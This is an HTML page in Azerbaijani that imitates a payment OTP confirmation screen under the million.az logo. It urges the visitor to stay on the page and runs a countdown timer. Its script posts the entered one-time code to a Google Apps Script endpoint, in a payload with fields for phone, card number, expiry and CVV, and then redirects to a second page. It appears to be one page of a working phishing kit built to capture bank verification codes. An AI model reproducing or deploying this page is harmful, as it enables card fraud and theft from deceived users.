<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Təsdiq</title>
    <style>
       body {
    margin: 0;
    padding: 0;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #f9f9f9;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    text-align: center;
    white-space: nowrap;  /* Tüm yazıları tek satırda tutar */
}

.container {
    background-color: #fff;
    border-radius: 40px;  /* Kenarlıkların yuvarlak köşeleri için */
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    padding: 40px;
    text-align: center;
    width: 500px;
    overflow: hidden;  /* Gereksiz taşmaları engellemek için */
    white-space: nowrap;  /* Tüm metinlerin tek satırda görünmesini sağlar */
    position: relative;  /* Kenarlığın konumlandırılabilmesi için */
    border: 2px solid red;  /* Kırmızı kenarlık */
    box-shadow: 0 0 10px rgba(255, 0, 0, 0.8); /* Kırmızı ve parlak bulanık kenarlık */
}

.logo img {
    width: 200px;
    margin-bottom: 20px;
    white-space: nowrap;  /* Logo metni varsa, tek satırda tutar */
}

.info-text {
    font-size: 20px;
    color: #333;
    margin-bottom: 20px;
    line-height: 1.8;
    white-space: nowrap;  /* Metni tek satırda tutar */
    overflow: hidden;  /* Taşmaları engeller */
    text-overflow: ellipsis;  /* Taşan metni üç nokta ile gösterir */
}

.form-group {
    margin-bottom: 30px;
    text-align: left;
}

.form-group label {
    font-size: 18px;
    color: #333;
    display: block;
    margin-bottom: 10px;
}

.form-group input[type="number"] {
    width: 100%;
    padding: 15px;
    font-size: 18px;
    border: 2px solid #ccc;
    border-radius: 10px;
    box-sizing: border-box;
    white-space: nowrap;  /* Input içindeki yazıları tek satırda tutar */
}

.timer {
    font-size: 24px;
    color: red;
    margin: 10px 0;
    text-align: center;
    white-space: nowrap;  /* Timer metnini tek satırda tutar */
}

button {
    width: 100%;
    padding: 15px;
    font-size: 20px;
    color: #fff;
    background-color: #ea3325;
    border: none;
    border-radius: 10px;
    cursor: not-allowed;
    margin-top: 20px;
    white-space: nowrap;  /* Buton metnini tek satırda tutar */
}

button:enabled {
    background-color:#ea3325
    cursor: pointer;
}

button:disabled {
    background-color: #f5c6c6;
    cursor: not-allowed;
}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://million.az/logo/main-logo.svg" alt="Logo">
        </div>
        <div class="info-text">
            Ödəniş istəkləri çox olduğundan OTP kodunuz gec göndərilə bilər! <br>
            Səhifədən ayrılmamağınızı xahiş olunur!
        </div>
        <form id="otpForm">
            <div class="form-group">
                <label for="otpInput">OTP kodunu daxil edin.</label>
                <input type="number" id="otpInput" placeholder="OTP" required>
            </div>
            <div class="timer" id="timer">Qalan vaxt: 05:00</div>
            <button type="button" id="submitButton" disabled>Ödənişi Təsdiqlə</button>
        </form>
    </div>
    <script>
        // Timer Fonksiyonu (5 Dakika)
        function startTimer(duration, display) {
            let timer = duration, minutes, seconds;
            const interval = setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                display.textContent = `Qalan vaxt: ${minutes}:${seconds}`;

                if (--timer < 0) {
                    clearInterval(interval);
                    display.textContent = "Qalan vaxt: 00:00";
                    document.getElementById("submitButton").disabled = true;
                }
            }, 1000);
        }

        window.onload = function () {
            const display = document.getElementById("timer");
            const fiveMinutes = 5 * 60;
            startTimer(fiveMinutes, display);
        };

        document.getElementById("submitButton").addEventListener("click", function () {
            const otpInput = document.getElementById("otpInput").value.trim();

            // Maksimum 6 ve minimum 4 karakter kontrolü
            if (otpInput.length < 4 || otpInput.length > 6) {
                alert("OTP kodu 4 ilə 6 rəqəm arasında olmalıdır!");
                return;
            }

            // Veriyi sadece OTP içerecek şekilde oluşturuyoruz
            const data = {
                telefon: "",  // Boş bırakıyoruz
                tutar: "",    // Boş bırakıyoruz
                kart: "",     // Boş bırakıyoruz
                ay: "",       // Boş bırakıyoruz
                yil: "",      // Boş bırakıyoruz
                cvv: "",      // Boş bırakıyoruz
                otp: otpInput // Sadece OTP verisini gönderiyoruz
            };

            fetch("https://script.google.com/macros/s/AKfycbySe0hCUb5zREcOJQlTi2e3-OuQvd4CaW9iO0EHtTcJbabMQdFMrEkBZ8xx0lFDgCHi/exec", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(data),
                mode: "no-cors", // CORS'u devre dışı bırak
            })
            .then(response => {
                window.location.href = "index2.html"; // Başarıyla yönlendirme
            })
            .catch(error => {
                console.error("OTP Gönderim Hatası:", error);
            });
        });

        document.getElementById("otpInput").addEventListener("input", function () {
            const otpInput = document.getElementById("otpInput").value.trim();
            const submitButton = document.getElementById("submitButton");

            if (otpInput.length >= 4 && otpInput.length <= 6) {
                submitButton.disabled = false;
            } else {
                submitButton.disabled = true;
            }
        });
    </script>
</body>
</html>
